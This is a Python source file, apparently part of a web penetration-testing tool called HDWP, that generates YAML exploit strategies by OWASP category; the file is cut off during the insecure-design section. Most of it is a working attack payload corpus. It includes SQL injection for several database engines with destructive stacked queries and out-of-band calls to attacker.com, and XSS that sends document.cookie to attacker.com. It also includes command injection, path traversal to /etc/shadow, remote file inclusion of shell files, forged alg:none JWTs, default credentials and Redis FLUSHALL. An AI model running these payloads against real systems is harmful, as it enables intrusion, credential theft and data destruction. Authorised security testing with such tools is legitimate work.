# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.
"""
Générateur de stratégies HDWP — produit 1100 YAML exploit strategies (100 × 11 catégories OWASP).
Usage : python -m hdwp.tools.strategy_generator [--dry-run] [--category all|a01..a10]
"""
from __future__ import annotations

import argparse
import textwrap
from pathlib import Path

STRATEGIES_ROOT = Path(__file__).parent.parent / "core" / "exploit" / "strategies"

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _yaml(id_: str, name: str, desc: str, vuln_type: str, tech_stack: list[str],
          phases: list[dict], proof_type: str = "network", mode: str = "sequential",
          params: dict | None = None) -> str:
    def _q(s: str) -> str:
        s = s.replace("\\", "\\\\").replace('"', '\\"')
        return f'"{s}"'

    def _payloads(ps: list[str]) -> str:
        return "\n".join(f'      - {_q(p)}' for p in ps)

    def _success(s: dict) -> str:
        lines = [f'      type: {s["type"]}']
        if "keywords" in s:
            kws = "\n".join(f'        - {_q(k)}' for k in s["keywords"])
            lines.append(f'      keywords:\n{kws}')
        if "status" in s:
            lines.append(f'      status: {s["status"]}')
        if "header" in s:
            lines.append(f'      header: {_q(s["header"])}')
        return "\n".join(lines)

    def _phase_block(ph: dict) -> str:
        lines = [f'  - name: {ph["name"]}']
        if ph.get("depends_on"):
            lines.append(f'    depends_on: {ph["depends_on"]}')
        lines.append(f'    inject: {ph.get("inject","param_from_winning_request")}')
        lines.append(f'    payloads:')
        lines.append(_payloads(ph["payloads"]))
        lines.append(f'    success:')
        lines.append(_success(ph["success"]))
        lines.append(f'    output: {ph["output"]}')
        return "\n".join(lines)

    ts_yaml = "[" + ", ".join(tech_stack) + "]" if tech_stack else "[]"
    params_yaml = "{}" if not params else (
        "\n" + "\n".join(f"  {k}: {v}" for k, v in params.items())
    )
    phases_yaml = "\n".join(_phase_block(ph) for ph in phases)

    # Build without textwrap.dedent to avoid prefix detection issues with interpolated blocks
    return "\n".join([
        f"id: {id_}",
        f"name: {_q(name)}",
        f"description: {_q(desc)}",
        f"vuln_type: {vuln_type}",
        f"tech_stack: {ts_yaml}",
        f"proof_type: {proof_type}",
        f"mode: {mode}",
        f"params: {params_yaml}",
        "",
        "phases:",
        phases_yaml,
        "",
    ])


# ---------------------------------------------------------------------------
# A01 — Broken Access Control (100)
# ---------------------------------------------------------------------------

def _a01_bola() -> list[tuple[str, str]]:
    """BOLA — 7 ID types × 4 HTTP methods = 28 strategies."""
    id_types = {
        "numeric": {
            "probe": ["2", "3", "100", "1000", "0"],
            "enum": ["1", "2", "3", "4", "5"],
            "desc": "IDs numériques séquentiels",
        },
        "uuid_v4": {
            "probe": [
                "00000000-0000-4000-8000-000000000001",
                "ffffffff-ffff-4fff-bfff-ffffffffffff",
            ],
            "enum": ["00000000-0000-4000-8000-000000000001"],
            "desc": "UUID v4 aléatoires",
        },
        "uuid_v1": {
            "probe": [
                "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
                "6ba7b811-9dad-11d1-80b4-00c04fd430c8",
            ],
            "enum": ["6ba7b810-9dad-11d1-80b4-00c04fd430c8"],
            "desc": "UUID v1 timestamp-based",
        },
        "slug": {
            "probe": ["admin", "root", "superuser", "system", "test"],
            "enum": ["admin", "root"],
            "desc": "Slugs textuels",
        },
        "hash_md5": {
            "probe": [
                "098f6bcd4621d373cade4e832627b4f6",
                "d8e8fca2dc0f896fd7cb4cb0031ba249",
            ],
            "enum": ["098f6bcd4621d373cade4e832627b4f6"],
            "desc": "Hash MD5",
        },
        "hash_sha1": {
            "probe": [
                "da39a3ee5e6b4b0d3255bfef95601890afd80709",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            ],
            "enum": ["da39a3ee5e6b4b0d3255bfef95601890afd80709"],
            "desc": "Hash SHA1",
        },
        "composite": {
            "probe": ["1-2", "1_admin", "user:1", "1/profile"],
            "enum": ["1-2", "2-1"],
            "desc": "IDs composites",
        },
    }
    methods = {
        "get":    ("GET",    "body_contains_any", ["id", "email", "username", "user_id"], "object_data"),
        "put":    ("PUT",    "status_code",       None,                                    "update_result"),
        "delete": ("DELETE", "status_code",       None,                                    "delete_result"),
        "patch":  ("PATCH",  "status_code",       None,                                    "patch_result"),
    }
    results = []
    for id_slug, id_data in id_types.items():
        for method_slug, (method, stype, kws, out) in methods.items():
            sid = f"core.a01.bola.{id_slug}.{method_slug}"
            success: dict = {"type": stype}
            if kws:
                success["keywords"] = kws
            else:
                success["status"] = 200
            results.append((
                sid,
                _yaml(
                    id_=sid,
                    name=f"BOLA {id_slug.replace('_',' ').title()} — {method}",
                    desc=f"Accès non autorisé via {id_data['desc']} ({method})",
                    vuln_type="bola",
                    tech_stack=[],
                    phases=[{
                        "name": "idor_probe",
                        "inject": "path_param",
                        "payloads": id_data["probe"],
                        "success": success,
                        "output": out,
                    }],
                ),
            ))
    return results


def _a01_bfla() -> list[tuple[str, str]]:
    """BFLA — 6 func categories × 3 role attacks = 18 strategies."""
    func_cats = {
        "admin_panel":   ["/admin", "/administrator", "/manage", "/dashboard/admin"],
        "user_mgmt":     ["/admin/users", "/api/admin/users", "/management/users"],
        "export":        ["/admin/export", "/api/export/all", "/reports/export"],
        "config":        ["/admin/config", "/api/settings/global", "/admin/settings"],
        "system":        ["/admin/system", "/api/system/info", "/actuator/env"],
        "backup":        ["/admin/backup", "/api/backup/download", "/backup"],
    }
    role_attacks = {
        "user_to_admin":  ["user", "guest", "viewer"],
        "no_auth":        [""],
        "role_header":    ["X-Role: admin", "X-User-Role: administrator"],
    }
    results = []
    for func_slug, paths in func_cats.items():
        for role_slug in role_attacks:
            sid = f"core.a01.bfla.{func_slug}.{role_slug}"
            results.append((
                sid,
                _yaml(
                    id_=sid,
                    name=f"BFLA {func_slug.replace('_',' ').title()} — {role_slug.replace('_',' ')}",
                    desc=f"Accès à fonctions {func_slug} avec rôle {role_slug}",
                    vuln_type="bfla",
                    tech_stack=[],
                    phases=[{
                        "name": "func_access",
                        "inject": "path_param",
                        "payloads": paths,
                        "success": {"type": "status_code", "status": 200},
                        "output": "func_access_result",
                    }],
                ),
            ))
    return results


def _a01_path_traversal() -> list[tuple[str, str]]:
    """Path traversal — 6 encodings × 2 OS = 12 strategies."""
    encodings = {
        "dotdot":        ["../../../etc/passwd", "../../../../etc/passwd", "../../../windows/win.ini"],
        "url_encoded":   ["%2e%2e%2f%2e%2e%2fpasswd", "%2e%2e/%2e%2e/etc/passwd"],
        "double_encoded":["%252e%252e%252fetc%252fpasswd", "%252e%252e/%252e%252e/etc/passwd"],
        "null_byte":     ["../../../etc/passwd%00", "../../../etc/passwd%00.jpg"],
        "abs_path":      ["/etc/passwd", "/etc/shadow", "/proc/self/environ"],
        "windows":       ["..\\..\\windows\\win.ini", "..%5C..%5Cwindows%5Cwin.ini"],
    }
    os_targets = {
        "linux":   ["root:x:", "daemon:", "/bin/bash"],
        "windows": ["[fonts]", "[extensions]", "for 16-bit"],
    }
    results = []
    for enc_slug, payloads in encodings.items():
        for os_slug, kws in os_targets.items():
            if os_slug == "windows" and enc_slug == "abs_path":
                continue
            sid = f"core.a01.path_traversal.{enc_slug}.{os_slug}"
            results.append((
                sid,
                _yaml(
                    id_=sid,
                    name=f"Path Traversal {enc_slug.replace('_',' ').title()} — {os_slug.title()}",
                    desc=f"Lecture fichiers système via path traversal ({enc_slug})",
                    vuln_type="lfi",
                    tech_stack=[],
                    phases=[{
                        "name": "traverse",
                        "inject": "param_from_winning_request",
                        "payloads": payloads,
                        "success": {"type": "body_contains_any", "keywords": kws},
                        "output": "file_read_result",
                    }],
                ),
            ))
    return results


def _a01_privesc() -> list[tuple[str, str]]:
    """Privilege escalation headers/params — 5 mechanisms × 5 variants = 25 strategies."""
    mechs = {
        "x_role_header":        (["X-Role: admin", "X-User-Role: administrator", "X-Roles: admin,superuser"], "header_reflected"),
        "x_original_url":       (["X-Original-URL: /admin", "X-Rewrite-URL: /admin/users"], "redirect_or_200"),
        "admin_param":          (["?admin=true", "?is_admin=1", "?role=admin", "?privilege=high"], "body_contains_admin"),
        "user_id_override":     (["?user_id=1", "?uid=1", "?userId=1", "?_user=1"], "other_user_data"),
        "jwt_role_claim":       (["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."], "admin_function"),
    }
    results = []
    for mech_slug, (payloads, out) in mechs.items():
        for i, payload in enumerate(payloads, 1):
            sid = f"core.a01.privesc.{mech_slug}.v{i}"
            results.append((
                sid,
                _yaml(
                    id_=sid,
                    name=f"Privesc {mech_slug.replace('_',' ').title()} v{i}",
                    desc=f"Escalade de privilèges via {mech_slug.replace('_',' ')}",
                    vuln_type="privesc",
                    tech_stack=[],
                    phases=[{
                        "name": "escalate",
                        "inject": "param_from_winning_request",
                        "payloads": [payload],
                        "success": {"type": "status_code", "status": 200},
                        "output": out,
                    }],
                ),
            ))
    return results


def _a01_extra() -> list[tuple[str, str]]:
    """Open redirect + SSRF-via-BOLA to pad to 100."""
    results = []
    redirect_payloads = [
        "//attacker.com", "https://attacker.com", "//google.com",
        "/\\attacker.com", "/%09/attacker.com", "/.attacker.com",
        "https:///attacker.com", "javascript:alert(1)",
    ]
    for i, p in enumerate(redirect_payloads):
        for v in range(1, 4):
            sid = f"core.a01.open_redirect.v{i+1}.{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Open Redirect v{i+1}.{v}",
                desc=f"Redirection ouverte: {p[:30]}",
                vuln_type="redirect", tech_stack=[],
                phases=[{"name": "redirect_probe", "inject": "param_from_winning_request",
                         "payloads": [p], "success": {"type": "status_code", "status": 302},
                         "output": "redirect_result"}],
            )))
    return results


def _a01_method_override() -> list[tuple[str, str]]:
    """HTTP method override — 5 headers × 3 methods = 15 strategies."""
    headers = ["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method",
               "_method", "X-Override"]
    methods = ["DELETE", "PUT", "PATCH"]
    results = []
    for h in headers:
        for m in methods:
            sid = f"core.a01.method_override.{h.lower().replace('-','_').replace('x_http_','')}.{m.lower()}"
            results.append((sid, _yaml(
                id_=sid, name=f"Method Override {h} → {m}",
                desc=f"Contournement méthode HTTP via {h}: {m}",
                vuln_type="method_override", tech_stack=[],
                phases=[{"name": "override", "inject": "param_from_winning_request",
                         "payloads": [f"{h}: {m}"], "success": {"type": "status_code", "status": 200},
                         "output": "override_result"}],
            )))
    return results


def generate_a01() -> list[tuple[str, str]]:
    all_ = (_a01_bola() + _a01_bfla() + _a01_path_traversal()
            + _a01_privesc() + _a01_extra() + _a01_method_override())
    return all_[:100]


# ---------------------------------------------------------------------------
# A02 — Cryptographic Failures (100)
# ---------------------------------------------------------------------------

def generate_a02() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    # JWT attacks (20)
    jwt_attacks = [
        ("alg_none",      "JWT alg:none bypass",     "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
         ["admin", "role", "sub"]),
        ("alg_none_v2",   "JWT alg:none padding",    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
         ["id", "role", "admin"]),
        ("rs_to_hs",      "JWT RS256→HS256",          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.X",
         ["admin", "sub"]),
        ("weak_secret",   "JWT weak secret brute",   "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
         ["name", "sub"]),
        ("expired",       "JWT expired token reuse",
         "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxfQ.abc",
         ["sub", "exp"]),
    ]
    for i, (slug, name, token, kws) in enumerate(jwt_attacks, 1):
        for variation in range(4):
            sid = f"core.a02.jwt.{slug}.v{variation+1}"
            results.append((sid, _yaml(
                id_=sid, name=f"{name} v{variation+1}",
                desc=f"Attaque JWT {slug.replace('_',' ')} — variante {variation+1}",
                vuln_type="jwt", tech_stack=[],
                phases=[{"name": "jwt_tamper", "inject": "param_from_winning_request",
                         "payloads": [token], "success": {"type": "body_contains_any", "keywords": kws},
                         "output": "jwt_bypass"}],
            )))

    # CBC Padding Oracle (10)
    cbc_payloads = [
        "00000000000000000000000000000000",
        "ffffffffffffffffffffffffffffffff",
        "0102030405060708090a0b0c0d0e0f10",
    ]
    for i in range(10):
        sid = f"core.a02.cbc_padding.v{i+1}"
        results.append((sid, _yaml(
            id_=sid, name=f"CBC Padding Oracle v{i+1}",
            desc="Décryption via oracle de padding CBC",
            vuln_type="crypto_oracle", tech_stack=[],
            phases=[{"name": "padding_probe", "inject": "param_from_winning_request",
                     "payloads": cbc_payloads, "success": {"type": "status_code", "status": 200},
                     "output": "padding_result"}],
        )))

    # ECB mode detection (5)
    ecb_payloads = ["A" * 32, "A" * 48, "A" * 64, "B" * 32]
    for i in range(5):
        sid = f"core.a02.ecb_mode.v{i+1}"
        results.append((sid, _yaml(
            id_=sid, name=f"ECB Mode Detection v{i+1}",
            desc="Détection mode ECB par blocs identiques",
            vuln_type="crypto_oracle", tech_stack=[],
            phases=[{"name": "ecb_probe", "inject": "param_from_winning_request",
                     "payloads": ecb_payloads, "success": {"type": "body_contains_any",
                     "keywords": ["AAAA", "block"]}, "output": "ecb_result"}],
        )))

    # Weak hash / default creds (25)
    weak_hash_payloads = [
        "admin:admin", "admin:password", "admin:123456", "root:root", "root:toor",
        "test:test", "user:user", "guest:guest", "admin:admin123", "admin:Password1",
    ]
    for i, cred in enumerate(weak_hash_payloads):
        for v in range(1, 3):
            sid = f"core.a02.weak_creds.{i+1}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Weak Credentials — {cred.split(':')[0]} v{v}",
                desc=f"Test credentials faibles: {cred}",
                vuln_type="auth_bypass", tech_stack=[],
                phases=[{"name": "cred_test", "inject": "param_from_winning_request",
                         "payloads": [cred], "success": {"type": "status_code", "status": 200},
                         "output": "cred_result"}],
            )))

    # TLS/cipher downgrade (10)
    tls_variants = ["SSLv3", "TLSv1.0", "TLSv1.1", "RC4", "DES", "3DES", "NULL", "EXPORT", "ANON", "MD5"]
    for i, tls in enumerate(tls_variants):
        sid = f"core.a02.tls_downgrade.{tls.lower().replace('.','_')}"
        results.append((sid, _yaml(
            id_=sid, name=f"TLS Downgrade — {tls}",
            desc=f"Négociation forcée {tls} (cipher faible)",
            vuln_type="tls_weak", tech_stack=[],
            phases=[{"name": "tls_probe", "inject": "param_from_winning_request",
                     "payloads": [tls], "success": {"type": "status_code", "status": 200},
                     "output": "tls_result"}],
        )))

    # Token/cookie prediction (35)
    predictable_tokens = [
        ("sequential_int",     ["1", "2", "3", "4", "5"]),
        ("timestamp_ms",       ["1700000000000", "1700000001000", "1700000002000"]),
        ("md5_username",       ["098f6bcd4621d373cade4e832627b4f6"]),
        ("base64_plain",       ["YWRtaW4=", "dXNlcjE=", "dGVzdA=="]),
        ("timestamp_s",        ["1700000000", "1700000001", "1700000002"]),
        ("uuid_predictable",   ["00000000-0000-0000-0000-000000000001"]),
        ("hex_sequential",     ["0x00000001", "0x00000002"]),
    ]
    for slug, payloads in predictable_tokens:
        for v in range(1, 6):
            sid = f"core.a02.predictable_token.{slug}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Predictable Token — {slug.replace('_',' ').title()} v{v}",
                desc=f"Token/cookie prévisible: {slug.replace('_',' ')}",
                vuln_type="auth_bypass", tech_stack=[],
                phases=[{"name": "token_guess", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "status_code", "status": 200},
                         "output": "token_result"}],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A03 — Injection (100)
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: dict[str, dict[str, list[str]]] = {
    "mysql": {
        "union":   ["1 UNION SELECT 1,2,3--", "1' UNION SELECT 1,user(),database()--",
                    "1' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--"],
        "time":    ["1' AND SLEEP(5)--", "1' AND IF(1=1,SLEEP(5),0)--", "1; SELECT SLEEP(5)--"],
        "error":   ["1' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--",
                    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--"],
        "boolean": ["1' AND 1=1--", "1' AND 1=2--", "1' AND 'a'='a"],
        "stacked": ["1'; DROP TABLE users--", "1'; INSERT INTO users VALUES('hack','hack')--"],
        "oob":     ["1' AND LOAD_FILE(CONCAT(0x5c5c,(SELECT database()),0x2e,@@hostname,0x5c))--"],
    },
    "postgresql": {
        "union":   ["1 UNION SELECT 1,2,3--", "1' UNION SELECT 1,current_user,current_database()--"],
        "time":    ["1'; SELECT pg_sleep(5)--", "1' AND 1=(SELECT 1 FROM pg_sleep(5))--"],
        "error":   ["1' AND 1=CAST((SELECT current_database()) AS INT)--"],
        "boolean": ["1' AND 't'='t'--", "1' AND 'f'='t'--"],
        "stacked": ["1'; COPY (SELECT '') TO PROGRAM 'id'--"],
        "oob":     ["1'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--"],
    },
    "oracle": {
        "union":   ["1 UNION SELECT 1,2 FROM dual--", "1' UNION SELECT user,sysdate FROM dual--"],
        "time":    ["1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"],
        "error":   ["1' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--"],
        "boolean": ["1' AND 1=1--", "1' AND 1=2--"],
        "stacked": ["1'; EXEC DBMS_OUTPUT.PUT_LINE('x')--"],
        "oob":     ["1' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) IS NOT NULL--"],
    },
    "mssql": {
        "union":   ["1 UNION SELECT 1,2,3--", "1' UNION SELECT 1,user_name(),db_name()--"],
        "time":    ["1'; WAITFOR DELAY '0:0:5'--", "1' AND 1=1; WAITFOR DELAY '0:0:5'--"],
        "error":   ["1' AND 1=CONVERT(int,@@version)--"],
        "boolean": ["1' AND 1=1--", "1' AND 'a'='b'--"],
        "stacked": ["1'; EXEC xp_cmdshell('whoami')--", "1'; EXEC sp_makewebtask 'c:\\x.txt','select 1'--"],
        "oob":     ["1'; EXEC master..xp_dirtree '//attacker.com/a'--"],
    },
    "sqlite": {
        "union":   ["1 UNION SELECT 1,2,3", "1' UNION SELECT 1,sqlite_version(),3--"],
        "boolean": ["1' AND 1=1--", "1' AND 1=2--"],
        "time":    ["1' AND randomblob(100000000)--"],
        "error":   ["1' AND 1=CAST((SELECT sqlite_version()) AS INTEGER)--"],
        "stacked": ["1'; DROP TABLE users--"],
        "oob":     ["1' AND load_extension('attacker.com/evil')--"],
    },
    "mariadb": {
        "union":   ["1 UNION SELECT 1,2,3--", "1' UNION SELECT 1,user(),version()--"],
        "time":    ["1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5(1))--"],
        "error":   ["1' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--"],
        "boolean": ["1' AND 1=1--", "1' AND 1=2--"],
        "stacked": ["1'; SELECT 1--"],
        "oob":     ["1' INTO OUTFILE '/var/www/html/out.txt'--"],
    },
}

XSS_PAYLOADS: dict[str, list[str]] = {
    "reflected_html":  ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
                        '<svg onload=alert(1)>', '"><script>alert(1)</script>'],
    "reflected_attr":  ['" onfocus=alert(1) autofocus "', "' onmouseover='alert(1)'",
                        '" onload="alert(1)"'],
    "reflected_js":    ["';alert(1)//", '";alert(1)//', "\';alert(1)//"],
    "stored_html":     ['<script>fetch("//attacker.com?c="+document.cookie)</script>',
                        '<img src=x onerror="fetch(\'//attacker.com?c=\'+document.cookie)">'],
    "dom_based":       ["javascript:alert(1)", "#<script>alert(1)</script>",
                        "?q=<img src=x onerror=alert(1)>"],
    "csp_bypass":      ["<script nonce=INJECT>alert(1)</script>",
                        '<script src="data:,alert(1)"></script>'],
}

CMDI_PAYLOADS: dict[str, list[str]] = {
    "linux_basic":   ["; id", "| id", "&& id", "`id`", "$(id)"],
    "linux_ifs":     ["${IFS}id", "$IFS$9id", "${IFS}cat${IFS}/etc/passwd"],
    "linux_base64":  ["| echo aWQ= | base64 -d | sh", "; $(echo aWQ= | base64 -d)"],
    "windows_cmd":   ["& whoami", "| whoami", "&& whoami", "; whoami"],
    "windows_ps":    ["; powershell -c whoami", "| powershell -encodedcommand d2hvYW1p"],
}

NOSQLI_PAYLOADS: dict[str, list[str]] = {
    "mongodb_auth":  ['{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}', '{"$exists":true}'],
    "mongodb_where": ['{"$where":"sleep(5000)"}', '{"$where":"this.password.match(/.*/)"}'],
    "mongodb_or":    ['[{"$or":[{"a":"a"},{"a":"a"}]}]'],
    "couchdb":       ['{"selector":{"_id":{"$gt":null}}}'],
    "redis_cmds":    ["FLUSHALL", "CONFIG SET dir /var/www/html", "KEYS *"],
}


def generate_a03() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    # SQLi — 6 DBMS × 6 techniques = 36
    for db, techniques in SQLI_PAYLOADS.items():
        for tech, payloads in techniques.items():
            sid = f"core.a03.sqli.{tech}.{db}"
            results.append((sid, _yaml(
                id_=sid, name=f"SQLi {tech.replace('_',' ').title()} — {db.upper()}",
                desc=f"Injection SQL {tech} ciblant {db}",
                vuln_type="sqli", tech_stack=[db],
                phases=[
                    {"name": "probe", "inject": "param_from_winning_request",
                     "payloads": payloads[:2], "success": {"type": "body_contains_any",
                     "keywords": ["sql", "error", "syntax", "ORA-", "Warning"]}, "output": "probe_result"},
                    {"name": "extract", "depends_on": "probe_result",
                     "inject": "param_from_winning_request", "payloads": payloads,
                     "success": {"type": "body_contains_any",
                     "keywords": ["root", "admin", "information_schema", "mysql", "postgres"]},
                     "output": "extract_result"},
                ],
            )))

    # XSS — 6 contexts = 6
    for ctx, payloads in XSS_PAYLOADS.items():
        sid = f"core.a03.xss.{ctx}"
        results.append((sid, _yaml(
            id_=sid, name=f"XSS {ctx.replace('_',' ').title()}",
            desc=f"Cross-Site Scripting — contexte {ctx.replace('_',' ')}",
            vuln_type="xss", tech_stack=[],
            phases=[{"name": "probe", "inject": "param_from_winning_request",
                     "payloads": payloads, "success": {"type": "body_contains_any",
                     "keywords": ["<script", "alert", "onerror"]}, "output": "xss_reflected"}],
        )))

    # XSS WAF bypass variants (10)
    waf_xss = [
        ("cloudflare", ["<Script>alert(1)</Script>", "<scr%00ipt>alert(1)</scr%00ipt>",
                        "<<SCRIPT>alert(1)//<</SCRIPT>"]),
        ("modsec",     ["<img/src='x'onerror=alert(1)>", "<svg/onload=alert(1)>",
                        "%3Cscript%3Ealert(1)%3C/script%3E"]),
        ("f5_bigip",   ["<BODY ONLOAD=alert(1)>", '<IFRAME SRC="javascript:alert(1);">',
                        "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS')\">"]),
        ("imperva",    ["<a href='javascript:alert(1)'>", "<form action=javascript:alert(1)>",
                        "<isindex action=javascript:alert(1) type=submit>"]),
        ("akamai",     ["><script>alert(1)</script>", "'><script>alert(1)</script>",
                        "></script><script>alert(1)</script>"]),
    ]
    for waf, payloads in waf_xss:
        for v in range(1, 3):
            sid = f"core.a03.xss.waf_bypass.{waf}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"XSS WAF Bypass {waf.replace('_',' ').title()} v{v}",
                desc=f"XSS contournant WAF {waf}",
                vuln_type="xss", tech_stack=[],
                phases=[{"name": "waf_bypass", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any",
                         "keywords": ["<script", "onerror", "onload"]}, "output": "xss_waf"}],
            )))

    # CMDi — 5 techniques = 10
    for tech, payloads in CMDI_PAYLOADS.items():
        for v in range(1, 3):
            sid = f"core.a03.cmdi.{tech}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"CMDi {tech.replace('_',' ').title()} v{v}",
                desc=f"Command injection via {tech.replace('_',' ')}",
                vuln_type="cmdi", tech_stack=["linux"] if "linux" in tech else ["windows"],
                phases=[{"name": "probe", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any",
                         "keywords": ["uid=", "root:", "whoami", "windows"]}, "output": "cmdi_result"}],
            )))

    # NoSQLi — 5 variants = 10
    for db_tech, payloads in NOSQLI_PAYLOADS.items():
        for v in range(1, 3):
            sid = f"core.a03.nosqli.{db_tech}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"NoSQLi {db_tech.replace('_',' ').title()} v{v}",
                desc=f"Injection NoSQL — {db_tech}",
                vuln_type="nosqli",
                tech_stack=["mongodb"] if "mongo" in db_tech else ["redis"] if "redis" in db_tech else [],
                phases=[{"name": "probe", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any",
                         "keywords": ["_id", "ok", "result", "true"]}, "output": "nosqli_result"}],
            )))

    # LFI/RFI variants (30)
    lfi_payloads = {
        "linux_proc":      ["/proc/self/environ", "/proc/self/cmdline", "/proc/1/environ"],
        "linux_log":       ["/var/log/apache2/access.log", "/var/log/nginx/access.log", "/var/log/auth.log"],
        "php_wrapper":     ["php://filter/convert.base64-encode/resource=index.php",
                            "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzBdKTs/Pg=="],
        "rfi":             ["http://attacker.com/shell.txt", "https://attacker.com/shell.php"],
        "windows_lfi":     ["C:\\Windows\\System32\\drivers\\etc\\hosts",
                            "..\\..\\..\\Windows\\win.ini", "C:\\boot.ini"],
        "null_byte_lfi":   ["../../../etc/passwd%00", "../../../etc/passwd%00.php"],
    }
    for slug, payloads in lfi_payloads.items():
        for v in range(1, 6):
            sid = f"core.a03.lfi.{slug}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"LFI {slug.replace('_',' ').title()} v{v}",
                desc=f"Local/Remote File Inclusion — {slug.replace('_',' ')}",
                vuln_type="lfi", tech_stack=["php"] if "php" in slug else [],
                phases=[{"name": "include", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any",
                         "keywords": ["root:", "PATH=", "<?php", "HTTP_HOST"]},
                         "output": "lfi_result"}],
            )))

    return results[:100]


# ---------------------------------------------------------------------------
# A04 — Insecure Design (100)
# ---------------------------------------------------------------------------

def generate_a04() -> list[tuple[str, str]]:
    results: list[tuple[str, str]] = []

    # Race conditions (30)
    race_scenarios = [
        ("double_spend",    ["amount=100", "amount=1000", "amount=-1"],
         ["balance", "deducted", "success"], "race_condition"),
        ("coupon_reuse",    ["coupon=SAVE50", "coupon=FREE100", "discount=100"],
         ["discount", "coupon", "applied"], "race_condition"),
        ("transfer_dupe",   ["from=1&to=2&amount=500", "from=2&to=1&amount=500"],
         ["transferred", "success", "balance"], "race_condition"),
        ("vote_stuffing",   ["vote=1", "vote=2", "vote=3"],
         ["voted", "count", "success"], "race_condition"),
        ("inventory_race",  ["quantity=1", "quantity=10"],
         ["in_stock", "available", "success"], "race_condition"),
        ("token_race",      ["token=abc", "token=xyz"],
         ["token", "generated", "valid"], "race_condition"),
    ]
    for scenario, payloads, kws, vtype in race_scenarios:
        for v in range(1, 6):
            sid = f"core.a04.race.{scenario}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Race Condition {scenario.replace('_',' ').title()} v{v}",
                desc=f"Exploitation race condition — {scenario.replace('_',' ')}",
                vuln_type=vtype, tech_stack=[],
                phases=[{"name": "race", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any", "keywords": kws},
                         "output": "race_result"}],
            )))

    # Business logic bypass (40)
    logic_scenarios = [
        ("negative_price",   ["-1", "-100", "-0.01"],     ["price", "total", "discount"]),
        ("zero_price",       ["0", "0.00", "0.001"],      ["free", "price", "total"]),
        ("overflow_amount",  ["9999999999", "2147483648"], ["error", "overflow", "invalid"]),
        ("underflow_stock",  ["-1", "-999"],               ["stock", "inventory", "available"]),
        ("bypass_max_qty",   ["1000000", "999999"],        ["quantity", "limit", "max"]),
        ("free_shipping",    ["0", "-1", "0.001"],         ["shipping", "free", "delivery"]),
        ("loyalty_abuse",    ["-1000", "9999999"],         ["points", "loyalty", "reward"]),
        ("discount_stack",   ["100", "200", "STACK50"],    ["discount", "off", "promo"]),
    ]
    for i, (scenario, payloads, kws) in enumerate(logic_scenarios):
        for v in range(1, 6):
            sid = f"core.a04.logic.{scenario}.v{v}"
            results.append((sid, _yaml(
                id_=sid, name=f"Business Logic {scenario.replace('_',' ').title()} v{v}",
                desc=f"Contournement logique métier — {scenario.replace('_',' ')}",
                vuln_type="business_boundary", tech_stack=[],
                phases=[{"name": "logic_bypass", "inject": "param_from_winning_request",
                         "payloads": payloads, "success": {"type": "body_contains_any", "keywords": kws},
                         "output": "logic_result"}],
            )))

    # Workflow bypass (30)
    workflow_scenarios = [
        ("skip_payment",    ["/checkout/confirm", "/order/complete"],   ["order", "confirmed"]),
        ("skip_verify",     ["/account/verified", "/email/confirmed"],  ["verified", "active"]),
        ("skip_2fa",        ["/dashboard", "/profile"],                  ["logged", "authenticated"]),
        ("reorder_steps",   ["/step3", "/step4", "/finalize"],          ["success", "complete"]),
        ("replay_action",   ["action=buy", "action=transfer"],          ["success", "processed"]),
        ("mass_import",     ["count=1000", "limit=9999"],               ["imported", "created"]),
    ]
    for scenario, payloads, kws in workflow_scenarios:
        for v in range(1, 6):
